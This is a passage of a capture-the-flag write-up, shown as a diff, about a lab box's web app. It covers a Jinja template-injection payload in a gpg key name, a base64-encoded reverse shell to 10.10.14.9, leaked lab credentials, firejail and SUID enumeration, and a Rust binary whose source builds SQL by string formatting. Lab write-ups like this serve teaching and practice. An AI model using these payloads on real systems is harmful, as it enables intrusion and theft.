@@ -155,28 +155,289 @@ Before we test for code execution we can dump the config:
 {% raw %} gpg --quick-generate-key "{{ config }}" default default never {% endraw %}
 ```
 
+![obraz](https://github.com/user-attachments/assets/f21dc65b-7ef4-407c-8949-cb14929c25f7)
+
+Config revealed mysql credentials:  
++  mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA
+
+Of course we can try it for ssh but it didn't work.  
+
+It's time to get malicious code execution, I was lucky and simple payload worked:  
+```
+{% raw %}  gpg --quick-generate-key "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" ed25519 default never {% endraw %}
+```
+![obraz](https://github.com/user-attachments/assets/1f3c58e4-da7f-4247-bf80-abecb82d512e)
+
+It worked, now it's time to use reverse shell, for syntax purposes I will base65 encode it.  
+```
+{% raw %}  {{request.application.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS85MDA1ICAwPiYxCg== | base64 -d | bash').read()}} {% endraw %}
+```
+
+![obraz](https://github.com/user-attachments/assets/9dc1049a-1f12-48b0-bc25-9064d3dbc392)  
+
+Now we need to start a listener and paste payload into the website:  
+
+![obraz](https://github.com/user-attachments/assets/7171f5d1-9c1c-432e-9985-f35931e64238)  
 
 
 
 
 
+## Privilege Escalation  
+
+If we check environment variables we can see that we're in jail:  
+```
+export -p
+```
+![obraz](https://github.com/user-attachments/assets/63b719be-763d-4512-8bb6-79297882c136)
+
++  container="firejail"
+
+It means we're in limited shell.  
+Some enumeration led to an intresting file:  
++  .config/httpie/sessions/localhost_5000/admin.json
+
+httpie - is a command-line HTTP client designed to make interacting with APIs and web services as simple and human-friendly as possible.  
+
+![obraz](https://github.com/user-attachments/assets/a4e7935e-89d1-4afb-8628-0bdde6db189a)
+
+It had credentials in plain text:  
++  silentobserver:quietLiketheWind22
+
+They work for ssh:  
+
+![obraz](https://github.com/user-attachments/assets/e42f7ed4-695e-4599-9c17-e7b32e76f261)
 
 
 
 
+## Privilege Escalation 2
+
+Now we can retrieve a flag:  
+
+![obraz](https://github.com/user-attachments/assets/9881915f-508e-44e8-8d77-c68026bef4eb)
+
+It's time for some basic enumeration:  
+sudo -l  ->  nothing  
+find / -perm -u=s 2>/dev/null  ->  revealed non standard SUID binaries:  
++  /opt/tipnet/target/debug/tipnet
++  /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
++  /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
++  /usr/local/bin/firejail
+
+let's leave it for now and check for crons running with pspy64:  
+```
+https://github.com/DominicBreuker/pspy/releases
+```
+
+![obraz](https://github.com/user-attachments/assets/443dd272-4587-4ce9-af8f-06195c0ce879)
+
+![obraz](https://github.com/user-attachments/assets/dd091843-3156-49d6-84f3-a6134e739536)
 
 
+It revealed some crons:  
++  /bin/bash /root/Cleanup/clean_c.sh  
++  /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+
+There is a tipnet binary written in rust, I'll paste it's source code here:  
+```rust
+extern crate logger;
+use sha2::{Digest, Sha256};
+use chrono::prelude::*;
+use mysql::*;
+use mysql::prelude::*;
+use std::fs;
+use std::process::Command;
+use std::io;
+
+// We don't spy on you... much.
+
+struct Entry {
+    timestamp: String,
+    target: String,
+    source: String,
+    data: String,
+}
+
+fn main() {
+    println!("                                                     
+             ,,                                      
+MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
+P'   MM   `7               MMN.    M           MM    
+     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
+     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
+     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
+     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
+   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
+                  MM                                 
+                .JMML.                               
+
+");
 
 
+    let mode = get_mode();
+    
+    if mode == "" {
+            return;
+    }
+    else if mode != "upstream" && mode != "pull" {
+        println!("[-] Mode is still being ported to Rust; try again later.");
+        return;
+    }
+
+    let mut conn = connect_to_db("Upstream").unwrap();
 
 
+    if mode == "pull" {
+        let source = "/var/www/html/SSA/SSA/submissions";
+        pull_indeces(&mut conn, source);
+        println!("[+] Pull complete.");
+        return;
+    }
 
+    println!("Enter keywords to perform the query:");
+    let mut keywords = String::new();
+    io::stdin().read_line(&mut keywords).unwrap();
 
+    if keywords.trim() == "" {
+        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
+        return;
+    }
 
+    println!("Justification for the search:");
+    let mut justification = String::new();
+    io::stdin().read_line(&mut justification).unwrap();
 
+    // Get Username 
+    let output = Command::new("/usr/bin/whoami")
+        .output()
+        .expect("nobody");
 
+    let username = String::from_utf8(output.stdout).unwrap();
+    let username = username.trim();
 
+    if justification.trim() == "" {
+        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
+        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
+        return;
+    }
 
+    logger::log(username, keywords.as_str().trim(), justification.as_str());
+
+    search_sigint(&mut conn, keywords.as_str().trim());
+
+}
+
+fn get_mode() -> String {
+
+        let valid = false;
+        let mut mode = String::new();
+
+        while ! valid {
+                mode.clear();
+
+                println!("Select mode of usage:");
+                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");
+
+                io::stdin().read_line(&mut mode).unwrap();
+
+                match mode.trim() {
+                        "a" => {
+                              println!("\n[+] Upstream selected");
+                              return "upstream".to_string();
+                        }
+                        "b" => {
+                              println!("\n[+] Muscular selected");
+                              return "regular".to_string();
+                        }
+                        "c" => {
+                              println!("\n[+] Tempora selected");
+                              return "emperor".to_string();
+                        }
+                        "d" => {
+                                println!("\n[+] PRISM selected");
+                                return "square".to_string();
+                        }
+                        "e" => {
+                                println!("\n[!] Refreshing indeces!");
+                                return "pull".to_string();
+                        }
+                        "q" | "Q" => {
+                                println!("\n[-] Quitting");
+                                return "".to_string();
+                        }
+                        _ => {
+                                println!("\n[!] Invalid mode: {}", mode);
+                        }
+                }
+        }
+        return mode;
+}
+
+fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
+    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
+    let pool = Pool::new(url).unwrap();
+    let mut conn = pool.get_conn().unwrap();
+    return Ok(conn);
+}
+
+fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
+    let keywords: Vec<&str> = keywords.split(" ").collect();
+    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");
+
+    for (i, keyword) in keywords.iter().enumerate() {
+        if i > 0 {
+            query.push_str("OR ");
+        }
+        query.push_str(&format!("data LIKE '%{}%' ", keyword));
+    }
+    let selected_entries = conn.query_map(
+        query,
+        |(timestamp, target, source, data)| {
+            Entry { timestamp, target, source, data }
+        },
+        ).expect("Query failed.");
+    for e in selected_entries {
+        println!("[{}] {} ===> {} | {}",
+                 e.timestamp, e.source, e.target, e.data);
+    }
+}
+
+fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
+    let paths = fs::read_dir(directory)
+        .unwrap()
+        .filter_map(|entry| entry.ok())
+        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
+        .map(|entry| entry.path());
+
+    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
+        .unwrap();
+    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
+        .unwrap();
+
+    let now = Utc::now();
+
+    for path in paths {
+        let contents = fs::read_to_string(path).unwrap();
+        let hash = Sha256::digest(contents.as_bytes());
+        let hash_hex = hex::encode(hash);
+
+        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
+        if existing_entry.is_none() {
+            let date = now.format("%Y-%m-%d").to_string();
+            println!("[+] {}\n", contents);
+            conn.exec_drop(&stmt_insert, params! {
+                "timestamp" => date,
+                "data" => contents,
+                "hash" => &hash_hex,
+                },
+                ).unwrap();
+        }
+    }
+    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");
+
+}
+```
 
 
 
